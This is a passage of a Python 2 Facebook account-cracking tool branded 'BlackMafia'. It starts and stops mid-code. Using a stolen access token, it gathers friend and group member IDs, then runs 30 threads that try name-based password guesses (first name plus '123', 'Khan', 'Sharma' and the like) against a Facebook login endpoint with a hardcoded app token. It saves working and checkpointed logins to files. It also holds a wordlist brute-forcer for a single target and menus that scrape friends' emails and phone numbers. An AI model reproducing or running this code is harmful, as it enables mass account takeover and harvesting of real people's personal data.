											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '12'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + b['last_name']
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + '1234'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)		
											                                       
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m???????????????????\033[1;91mBlackMafia\033[1;95m???????????????????"
	print '\033[1;95mProcess Has Been Completed Press? Type 0 Enter? Next Type 0 (logout)?\033[1;97m....'
        print '\033[1;95mNext Type (python2 Target.py) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
			
	def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print "\033[1;97m-???-\033[1;97m> \033[1;97m1.\x1b[1;93mClone Friend List Public ID."
        time.sleep(0.05)
	print "\033[1;97m-???-\033[1;97m> \033[1;97m0.\033[1;91mBack"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;95mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;94mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		uty = raw_input("\033[1;97m[???] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
		print "\033[1;97m???????????????????\033[1;94mBlackMafia\033[1;97m???????????????????"
		try:
			kk = requests.get("https://graph.facebook.com/"+uty+"?access_token="+toket)
			hh = json.loads(kk.text)
			print"\033[1;97mName\033[1;97m:\033[1;94m "+hh["name"]
		except KeyError:
			print"\x1b[1;97mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
			super()
		print"\033[1;94mGetting IDs\033[1;97m..."
		v = requests.get("https://graph.facebook.com/"+uty+"/friends?access_token="+toket)
		f = json.loads(v.text)
		for e in f['data']:
			id.append(e['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_super()
	
	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
	jalan('\033[1;94mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m?-----\x1b[1;91m¡¾To Stop Process Press CTRL+Z¡¿\033[1;97m----?"
	print "\033[1;97m?--------------------\033[1;92m?\033[1;97m--------------------?"
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m           Start Cloning Indian')
	print "\033[1;97m?--------------------\033[1;92m?\033[1;97m--------------------?"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Sayyed_Zakarya
		try:
			g = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			l = json.loads(a.text)
			pass1 = l['first_name']+'Khan'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			e = json.load(data)
			if 'access_token' in e:
				print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in e["error_msg"]:
					print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = l['first_name']+'Gupta'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					e = json.load(data)
					if 'access_token' in e:
						print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in e["error_msg"]:
							print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = l['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							e = json.load(data)
							if 'access_token' in e:
								print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in e["error_msg"]:
									print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = l['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									e = json.load(data)
									if 'access_token' in e:
										print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in e["error_msg"]:
											print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = l['first_name'] + 'Thakur'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											e = json.load(data)
											if 'access_token' in e:
												print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in e["error_msg"]:
													print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = l['first_name'] + l['last_name']
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													e = json.load(data)
													if 'access_token' in e:
														print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in e["error_msg"]:
															print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = l['first_name']+'Sharma'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															e = json.load(data)
															if 'access_token' in e:
																print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m?\x1b[1;97m-' + user + '-\x1b[1;92m?\x1b[1;97m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in e["error_msg"]:
																	print '\x1b[1;91mError\x1b[1;97m-\x1b[1;91m?\x1b[1;97m-' + user + '-\x1b[1;91m?\x1b[1;97m-' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m???????????????????\033[1;91mBlackMafia\033[1;95m???????????????????"
	print '\033[1;95mProcess Has Been Completed Press? Type 0 Enter? Next Type 0 (logout)?\033[1;97m....'
        print '\033[1;95mNext Type (python2 Target.py) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	
def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.001)
        login()
    else:
        os.system('clear')
        print '\033[1;93m ??????????????????????????????????.'
        try:
            email = raw_input('\x1b[1;91m[¡ñ] \x1b[1;92mID\x1b[1;97m/\x1b[1;91mEmail \x1b[1;92mTarget \x1b[1;91m:\x1b[1;96m ')
            passw = raw_input('\x1b[1;91m[¡ñ] \x1b[1;92mWordlist \x1b[1;97m(Type?Mr-Robot.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\033[1;95m ??????????????????????????????????.'
            print '\x1b[1;93m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            time.sleep(0.05)
            print '\x1b[1;93m[+] \x1b[1;93mTotal\x1b[1;94m ' + str(len(total)) + ' \x1b[1;92mPassword'
            time.sleep(0.05)
            jalan('\x1b[1;93m[\xe2\x9c\xba] \x1b[1;95mPlease wait \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' ¡ñ ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print 52 * '\x1b[1;93m\xe2\x95\x90'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;95mUsername \x1b[1;91m:\x1b[1;92m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;91mPassword \x1b[1;91m:\x1b[1;91m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                            print  "\033[1;96m ??????????????????????????????????."
                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                            time.sleep(0.05)
                            print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;95mUsername \x1b[1;93m:\x1b[1;92m ' + email
                            time.sleep(0.05)
                            print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;95mPassword \x1b[1;93m:\x1b[1;91m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print """\n\x1b[1;91m[!] \x1b[1;93mAdd another wordlist corect name"""
            super()
            
 
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar() 
			

def asif():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print "\033[1;93m-???-\033[1;93m> \033[1;93m1 .\x1b[1;91m«ã Get      ID From Friends      "
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;93m> \033[1;93m2 .\033[1;91m«ã Friends  ID From Friends      "
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;93m> \033[1;93m3 .\033[1;91m«ã Get      ID From GRUP         "
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;93m> \033[1;93m4 .\033[1;91m«ã Get      Friends Email        "
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;93m> \033[1;93m5 .\033[1;91m«ã Friends  Email   From  Friends"
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;93m> \033[1;93m6 .\033[1;91m«ã Get      Phone   From  Friends"
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;93m> \033[1;93m7 .\033[1;91m«ã Friend's Phone   From  Friends"
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;93m> \033[1;93m8 .\033[1;91m«ã Get All  Information   From  Friends"
        time.sleep(0.05)
	print "\033[1;93m-???-\033[1;93m> \033[1;93m0 .\033[1;92m«ã Back                          "
	pilih_asif()

def pilih_asif():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_asif()
	elif peak =="1":
		id_friends()
        elif peak =="2":
	        idfrom_friends()
        elif peak =="3":
                id_member_grup()
        elif peak =="4":
	        email()
        elif peak =="5":
	        emailfrom_friends()
        elif peak =="6":
	        nomor_hp()
        elif peak =="7":
	        hpfrom_friends()
        elif peak =="8":
                informasi()
	elif peak =="0":
		menu()

def id_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')

        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print 52 * '\x1b[1;95m\xe2\x95\x90'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            save_id = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            bz = open(save_id, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for ah in z['data']:
                idfriends.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;96mName\x1b[1;91m  :\x1b[1;97m ' + ah['name']
                print '\x1b[1;91mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
                print 52 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile Save \x1b[1;91m: \x1b[1;97m' + save_id
            bz.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except KeyError:
            os.remove(save_id)
            print '\x1b[1;91m[!] An error occurred'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def idfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID Friends \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Not be friends'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                asif()

            r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
            z = json.loads(r.text)
            save_idt = raw_input('\x1b[1;91m[+] \x1b[1;92mType File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            bz = open(save_idt, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mplzz wi8 \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for ah in z['friends']['data']:
                idfromfriends.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + ah['name']
                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
                print 52 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idfromfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile Save \x1b[1;91m: \x1b[1;97m' + save_idt
            bz.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def id_member_grup():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID grup \x1b[1;91m:\x1b[1;97m ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
                asw = json.loads(r.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName group \x1b[1;91m:\x1b[1;97m ' + asw['name']
            except KeyError:
                print '\x1b[1;91m[!] Group not found'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                asif()

            simg = raw_input('\x1b[1;91m[+] \x1b[1;97mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            b = open(simg, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mplzz wi8 \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&access_token=' + toket)
            s = json.loads(re.text)
            for i in s['data']:
                idmem.append(i['id'])
                b.write(i['id'] + '\n')
                print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + i['name']
                print '\x1b[1;92mID  \x1b[1;91m  :\x1b[1;97m ' + i['id']
                print 52 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idmem)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + simg
            b.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except KeyError:
            os.remove(simg)
            print '\x1b[1;91m[!] Group not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def email():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    em.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Email\x1b[1;96m%s' % len(em)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except KeyError:
            os.remove(mails)
            print '\x1b[1;91m[!] An error occurred'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def emailfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID Friends \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Not be friends'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                asif()

            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    emfromfriends.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;95m ' + z['name']
                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;96m' + z['email']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Email\x1b[1;96m%s' % len(emfromfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def nomor_hp():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
